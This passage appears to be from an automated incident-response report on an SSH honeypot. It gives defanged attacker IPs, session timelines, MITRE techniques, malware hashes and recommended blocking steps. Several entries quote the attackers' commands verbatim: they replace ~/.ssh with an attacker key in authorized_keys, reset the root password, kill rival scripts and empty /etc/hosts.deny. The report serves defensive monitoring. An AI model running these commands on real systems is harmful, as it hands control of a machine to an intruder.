| `2026-04-08 09:58:57` | `cowrie.log.closed` |
| `2026-04-08 09:58:57` | `cowrie.session.params` |
| `2026-04-08 09:58:57` | `cowrie.command.input` |
| `2026-04-08 09:58:57` | `cowrie.session.file_download` |
| `2026-04-08 09:58:57` | `cowrie.log.closed` |
| `2026-04-08 09:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad4d3902c9a

| Field | Detail |
|---|---|
| **Source IP** | `35.237.94[.]18` |
| **First Seen** | 2026-04-08 09:59 |
| **Last Seen** | 2026-04-08 09:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:59:00` | `cowrie.session.connect` |
| `2026-04-08 09:59:00` | `cowrie.client.version` |
| `2026-04-08 09:59:01` | `cowrie.client.kex` |
| `2026-04-08 09:59:02` | `cowrie.login.success` |
| `2026-04-08 09:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.237.94[.]18` to AbuseIPDB if not already reported
- [ ] Block `35.237.94[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7687210e6c7

| Field | Detail |
|---|---|
| **Source IP** | `120.48.42[.]17` |
| **First Seen** | 2026-04-08 09:59 |
| **Last Seen** | 2026-04-08 10:00 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TmbxgFAdMLb7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:59:04` | `cowrie.session.connect` |
| `2026-04-08 09:59:04` | `cowrie.client.version` |
| `2026-04-08 09:59:05` | `cowrie.client.kex` |
| `2026-04-08 09:59:11` | `cowrie.login.success` |
| `2026-04-08 09:59:15` | `cowrie.session.params` |
| `2026-04-08 09:59:15` | `cowrie.command.input` |
| `2026-04-08 09:59:15` | `cowrie.command.failed` |
| `2026-04-08 09:59:15` | `cowrie.log.closed` |
| `2026-04-08 09:59:16` | `cowrie.session.params` |
| `2026-04-08 09:59:16` | `cowrie.command.input` |
| `2026-04-08 09:59:16` | `cowrie.session.file_download` |
| `2026-04-08 09:59:16` | `cowrie.log.closed` |
| `2026-04-08 09:59:34` | `cowrie.session.params` |
| `2026-04-08 09:59:34` | `cowrie.command.input` |
| `2026-04-08 09:59:35` | `cowrie.log.closed` |
| `2026-04-08 09:59:36` | `cowrie.session.params` |
| `2026-04-08 09:59:36` | `cowrie.command.input` |
| `2026-04-08 09:59:36` | `cowrie.log.closed` |
| `2026-04-08 09:59:37` | `cowrie.session.params` |
| `2026-04-08 09:59:37` | `cowrie.command.input` |
| `2026-04-08 09:59:38` | `cowrie.session.file_download` |
| `2026-04-08 09:59:38` | `cowrie.log.closed` |
| `2026-04-08 09:59:38` | `cowrie.session.params` |
| `2026-04-08 09:59:38` | `cowrie.command.input` |
| `2026-04-08 09:59:40` | `cowrie.log.closed` |
| `2026-04-08 09:59:41` | `cowrie.session.params` |
| `2026-04-08 09:59:41` | `cowrie.command.input` |
| `2026-04-08 09:59:42` | `cowrie.log.closed` |
| `2026-04-08 09:59:44` | `cowrie.session.params` |
| `2026-04-08 09:59:44` | `cowrie.command.input` |
| `2026-04-08 09:59:44` | `cowrie.command.input` |
| `2026-04-08 09:59:44` | `cowrie.log.closed` |
| `2026-04-08 09:59:48` | `cowrie.session.params` |
| `2026-04-08 09:59:48` | `cowrie.command.input` |
| `2026-04-08 09:59:48` | `cowrie.log.closed` |
| `2026-04-08 09:59:50` | `cowrie.session.params` |
| `2026-04-08 09:59:50` | `cowrie.command.input` |
| `2026-04-08 09:59:50` | `cowrie.log.closed` |
| `2026-04-08 09:59:50` | `cowrie.session.params` |
| `2026-04-08 09:59:50` | `cowrie.command.input` |
| `2026-04-08 09:59:52` | `cowrie.log.closed` |
| `2026-04-08 09:59:54` | `cowrie.session.params` |
| `2026-04-08 09:59:54` | `cowrie.command.input` |
| `2026-04-08 09:59:54` | `cowrie.log.closed` |
| `2026-04-08 09:59:55` | `cowrie.session.params` |
| `2026-04-08 09:59:55` | `cowrie.command.input` |
| `2026-04-08 09:59:55` | `cowrie.log.closed` |
| `2026-04-08 09:59:57` | `cowrie.session.params` |
| `2026-04-08 09:59:57` | `cowrie.command.input` |
| `2026-04-08 09:59:59` | `cowrie.log.closed` |
| `2026-04-08 10:00:00` | `cowrie.session.params` |
| `2026-04-08 10:00:00` | `cowrie.command.input` |
| `2026-04-08 10:00:01` | `cowrie.log.closed` |
| `2026-04-08 10:00:02` | `cowrie.session.params` |
| `2026-04-08 10:00:02` | `cowrie.command.input` |
| `2026-04-08 10:00:02` | `cowrie.log.closed` |
| `2026-04-08 10:00:04` | `cowrie.session.params` |
| `2026-04-08 10:00:04` | `cowrie.command.input` |
| `2026-04-08 10:00:04` | `cowrie.log.closed` |
| `2026-04-08 10:00:06` | `cowrie.session.params` |
| `2026-04-08 10:00:06` | `cowrie.command.input` |
| `2026-04-08 10:00:06` | `cowrie.log.closed` |
| `2026-04-08 10:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.42[.]17` to AbuseIPDB if not already reported
- [ ] Block `120.48.42[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e665eb3c14

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 09:59 |
| **Last Seen** | 2026-04-08 10:00 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:59:34` | `cowrie.session.connect` |
| `2026-04-08 09:59:35` | `cowrie.client.version` |
| `2026-04-08 09:59:35` | `cowrie.client.kex` |
| `2026-04-08 09:59:38` | `cowrie.login.success` |
| `2026-04-08 09:59:42` | `cowrie.session.params` |
| `2026-04-08 09:59:42` | `cowrie.command.input` |
| `2026-04-08 09:59:42` | `cowrie.command.failed` |
| `2026-04-08 09:59:45` | `cowrie.log.closed` |
| `2026-04-08 09:59:51` | `cowrie.session.params` |
| `2026-04-08 09:59:51` | `cowrie.command.input` |
| `2026-04-08 09:59:56` | `cowrie.session.file_download` |
| `2026-04-08 09:59:56` | `cowrie.log.closed` |
| `2026-04-08 10:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f323f800b546

| Field | Detail |
|---|---|
| **Source IP** | `20.2.83[.]149` |
| **First Seen** | 2026-04-08 09:59 |
| **Last Seen** | 2026-04-08 10:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 09:59:59` | `cowrie.session.connect` |
| `2026-04-08 10:00:00` | `cowrie.client.version` |
| `2026-04-08 10:00:00` | `cowrie.client.kex` |
| `2026-04-08 10:00:06` | `cowrie.login.success` |
| `2026-04-08 10:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.2.83[.]149` to AbuseIPDB if not already reported
- [ ] Block `20.2.83[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbdaa0c15938

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-08 10:00 |
| **Last Seen** | 2026-04-08 10:00 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:00:14` | `cowrie.session.connect` |
| `2026-04-08 10:00:14` | `cowrie.client.version` |
| `2026-04-08 10:00:18` | `cowrie.client.kex` |
| `2026-04-08 10:00:19` | `cowrie.login.success` |
| `2026-04-08 10:00:20` | `cowrie.session.params` |
| `2026-04-08 10:00:20` | `cowrie.command.input` |
| `2026-04-08 10:00:20` | `cowrie.command.failed` |
| `2026-04-08 10:00:20` | `cowrie.log.closed` |
| `2026-04-08 10:00:21` | `cowrie.session.params` |
| `2026-04-08 10:00:21` | `cowrie.command.input` |
| `2026-04-08 10:00:21` | `cowrie.session.file_download` |
| `2026-04-08 10:00:21` | `cowrie.log.closed` |
| `2026-04-08 10:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe2f37545e6

| Field | Detail |
|---|---|
| **Source IP** | `144.48.243[.]18` |
| **First Seen** | 2026-04-08 10:00 |
| **Last Seen** | 2026-04-08 10:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:00:24` | `cowrie.session.connect` |
| `2026-04-08 10:00:24` | `cowrie.client.version` |
| `2026-04-08 10:00:24` | `cowrie.client.kex` |
| `2026-04-08 10:00:25` | `cowrie.login.success` |
| `2026-04-08 10:00:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.48.243[.]18` to AbuseIPDB if not already reported
- [ ] Block `144.48.243[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09b59749dd8

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:00 |
| **Last Seen** | 2026-04-08 10:01 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:YyRSC12l32H3"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:00:42` | `cowrie.session.connect` |
| `2026-04-08 10:00:42` | `cowrie.client.version` |
| `2026-04-08 10:00:42` | `cowrie.client.kex` |
| `2026-04-08 10:00:43` | `cowrie.login.success` |
| `2026-04-08 10:00:43` | `cowrie.session.params` |
| `2026-04-08 10:00:43` | `cowrie.command.input` |
| `2026-04-08 10:00:43` | `cowrie.command.failed` |
| `2026-04-08 10:00:43` | `cowrie.log.closed` |
| `2026-04-08 10:00:44` | `cowrie.session.params` |
| `2026-04-08 10:00:44` | `cowrie.command.input` |
| `2026-04-08 10:00:44` | `cowrie.session.file_download` |
| `2026-04-08 10:00:44` | `cowrie.log.closed` |
| `2026-04-08 10:00:56` | `cowrie.session.params` |
| `2026-04-08 10:00:56` | `cowrie.command.input` |
| `2026-04-08 10:00:56` | `cowrie.log.closed` |
| `2026-04-08 10:00:57` | `cowrie.session.params` |
| `2026-04-08 10:00:57` | `cowrie.command.input` |
| `2026-04-08 10:00:57` | `cowrie.log.closed` |
| `2026-04-08 10:00:57` | `cowrie.session.params` |
| `2026-04-08 10:00:57` | `cowrie.command.input` |
| `2026-04-08 10:00:57` | `cowrie.session.file_download` |
| `2026-04-08 10:00:57` | `cowrie.log.closed` |
| `2026-04-08 10:00:58` | `cowrie.session.params` |
| `2026-04-08 10:00:58` | `cowrie.command.input` |
| `2026-04-08 10:00:58` | `cowrie.log.closed` |
| `2026-04-08 10:00:58` | `cowrie.session.params` |
| `2026-04-08 10:00:58` | `cowrie.command.input` |
| `2026-04-08 10:00:58` | `cowrie.log.closed` |
| `2026-04-08 10:00:59` | `cowrie.session.params` |
| `2026-04-08 10:00:59` | `cowrie.command.input` |
| `2026-04-08 10:00:59` | `cowrie.command.input` |
| `2026-04-08 10:00:59` | `cowrie.log.closed` |
| `2026-04-08 10:00:59` | `cowrie.session.params` |
| `2026-04-08 10:00:59` | `cowrie.command.input` |
| `2026-04-08 10:00:59` | `cowrie.log.closed` |
| `2026-04-08 10:01:00` | `cowrie.session.params` |
| `2026-04-08 10:01:00` | `cowrie.command.input` |
| `2026-04-08 10:01:00` | `cowrie.log.closed` |
| `2026-04-08 10:01:00` | `cowrie.session.params` |
| `2026-04-08 10:01:00` | `cowrie.command.input` |
| `2026-04-08 10:01:00` | `cowrie.log.closed` |
| `2026-04-08 10:01:01` | `cowrie.session.params` |
| `2026-04-08 10:01:01` | `cowrie.command.input` |
| `2026-04-08 10:01:01` | `cowrie.log.closed` |
| `2026-04-08 10:01:02` | `cowrie.session.params` |
| `2026-04-08 10:01:02` | `cowrie.command.input` |
| `2026-04-08 10:01:02` | `cowrie.log.closed` |
| `2026-04-08 10:01:02` | `cowrie.session.params` |
| `2026-04-08 10:01:02` | `cowrie.command.input` |
| `2026-04-08 10:01:02` | `cowrie.log.closed` |
| `2026-04-08 10:01:03` | `cowrie.session.params` |
| `2026-04-08 10:01:03` | `cowrie.command.input` |
| `2026-04-08 10:01:03` | `cowrie.log.closed` |
| `2026-04-08 10:01:03` | `cowrie.session.params` |
| `2026-04-08 10:01:03` | `cowrie.command.input` |
| `2026-04-08 10:01:03` | `cowrie.log.closed` |
| `2026-04-08 10:01:04` | `cowrie.session.params` |
| `2026-04-08 10:01:04` | `cowrie.command.input` |
| `2026-04-08 10:01:04` | `cowrie.log.closed` |
| `2026-04-08 10:01:04` | `cowrie.session.params` |
| `2026-04-08 10:01:04` | `cowrie.command.input` |
| `2026-04-08 10:01:04` | `cowrie.log.closed` |
| `2026-04-08 10:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8650f93bf127

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:01 |
| **Last Seen** | 2026-04-08 10:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:01:05` | `cowrie.session.connect` |
| `2026-04-08 10:01:05` | `cowrie.client.version` |
| `2026-04-08 10:01:05` | `cowrie.client.kex` |
| `2026-04-08 10:01:05` | `cowrie.login.success` |
| `2026-04-08 10:01:06` | `cowrie.session.params` |
| `2026-04-08 10:01:06` | `cowrie.command.input` |
| `2026-04-08 10:01:06` | `cowrie.command.failed` |
| `2026-04-08 10:01:06` | `cowrie.log.closed` |
| `2026-04-08 10:01:06` | `cowrie.session.params` |
| `2026-04-08 10:01:06` | `cowrie.command.input` |
| `2026-04-08 10:01:06` | `cowrie.session.file_download` |
| `2026-04-08 10:01:06` | `cowrie.log.closed` |
| `2026-04-08 10:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5093aedadcf

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]242` |
| **First Seen** | 2026-04-08 10:01 |
| **Last Seen** | 2026-04-08 10:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:01:08` | `cowrie.session.connect` |
| `2026-04-08 10:01:08` | `cowrie.client.version` |
| `2026-04-08 10:01:08` | `cowrie.client.kex` |
| `2026-04-08 10:01:09` | `cowrie.login.success` |
| `2026-04-08 10:01:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]242` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c03bb80d55e2

| Field | Detail |
|---|---|
| **Source IP** | `46.8.237[.]64` |
| **First Seen** | 2026-04-08 10:01 |
| **Last Seen** | 2026-04-08 10:01 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:7FThLjKlxrj8"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 10:01:37` | `cowrie.session.connect` |
| `2026-04-08 10:01:37` | `cowrie.client.version` |
| `2026-04-08 10:01:37` | `cowrie.client.kex` |
| `2026-04-08 10:01:38` | `cowrie.login.success` |
| `2026-04-08 10:01:38` | `cowrie.session.params` |
| `2026-04-08 10:01:38` | `cowrie.command.input` |
| `2026-04-08 10:01:38` | `cowrie.command.failed` |
| `2026-04-08 10:01:38` | `cowrie.log.closed` |
| `2026-04-08 10:01:39` | `cowrie.session.params` |
| `2026-04-08 10:01:39` | `cowrie.command.input` |
| `2026-04-08 10:01:39` | `cowrie.session.file_download` |
| `2026-04-08 10:01:39` | `cowrie.log.closed` |
| `2026-04-08 10:01:47` | `cowrie.session.params` |
| `2026-04-08 10:01:47` | `cowrie.command.input` |
| `2026-04-08 10:01:47` | `cowrie.log.closed` |
| `2026-04-08 10:01:48` | `cowrie.session.params` |
| `2026-04-08 10:01:48` | `cowrie.command.input` |
| `2026-04-08 10:01:48` | `cowrie.log.closed` |
| `2026-04-08 10:01:48` | `cowrie.session.params` |
| `2026-04-08 10:01:48` | `cowrie.command.input` |
| `2026-04-08 10:01:48` | `cowrie.session.file_download` |
| `2026-04-08 10:01:48` | `cowrie.log.closed` |
| `2026-04-08 10:01:49` | `cowrie.session.params` |
| `2026-04-08 10:01:49` | `cowrie.command.input` |
| `2026-04-08 10:01:49` | `cowrie.log.closed` |
| `2026-04-08 10:01:49` | `cowrie.session.params` |
| `2026-04-08 10:01:49` | `cowrie.command.input` |
| `2026-04-08 10:01:49` | `cowrie.log.closed` |
| `2026-04-08 10:01:50` | `cowrie.session.params` |
| `2026-04-08 10:01:50` | `cowrie.command.input` |
| `2026-04-08 10:01:50` | `cowrie.command.input` |
| `2026-04-08 10:01:50` | `cowrie.log.closed` |
| `2026-04-08 10:01:50` | `cowrie.session.params` |
| `2026-04-08 10:01:50` | `cowrie.command.input` |
| `2026-04-08 10:01:50` | `cowrie.log.closed` |
| `2026-04-08 10:01:51` | `cowrie.session.params` |
| `2026-04-08 10:01:51` | `cowrie.command.input` |
| `2026-04-08 10:01:51` | `cowrie.log.closed` |
| `2026-04-08 10:01:51` | `cowrie.session.params` |
| `2026-04-08 10:01:51` | `cowrie.command.input` |
| `2026-04-08 10:01:51` | `cowrie.log.closed` |
| `2026-04-08 10:01:52` | `cowrie.session.params` |
| `2026-04-08 10:01:52` | `cowrie.command.input` |
| `2026-04-08 10:01:52` | `cowrie.log.closed` |
| `2026-04-08 10:01:52` | `cowrie.session.params` |
| `2026-04-08 10:01:52` | `cowrie.command.input` |
| `2026-04-08 10:01:53` | `cowrie.log.closed` |
| `2026-04-08 10:01:53` | `cowrie.session.params` |
| `2026-04-08 10:01:53` | `cowrie.command.input` |
| `2026-04-08 10:01:53` | `cowrie.log.closed` |
| `2026-04-08 10:01:53` | `cowrie.session.params` |
| `2026-04-08 10:01:53` | `cowrie.command.input` |
| `2026-04-08 10:01:54` | `cowrie.log.closed` |
| `2026-04-08 10:01:54` | `cowrie.session.params` |
| `2026-04-08 10:01:54` | `cowrie.command.input` |
| `2026-04-08 10:01:54` | `cowrie.log.closed` |
| `2026-04-08 10:01:54` | `cowrie.session.params` |
| `2026-04-08 10:01:54` | `cowrie.command.input` |
| `2026-04-08 10:01:55` | `cowrie.log.closed` |
| `2026-04-08 10:01:55` | `cowrie.session.params` |
| `2026-04-08 10:01:55` | `cowrie.command.input` |
| `2026-04-08 10:01:55` | `cowrie.log.closed` |
| `2026-04-08 10:01:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.8.237[.]64` to AbuseIPDB if not already reported
- [ ] Block `46.8.237[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
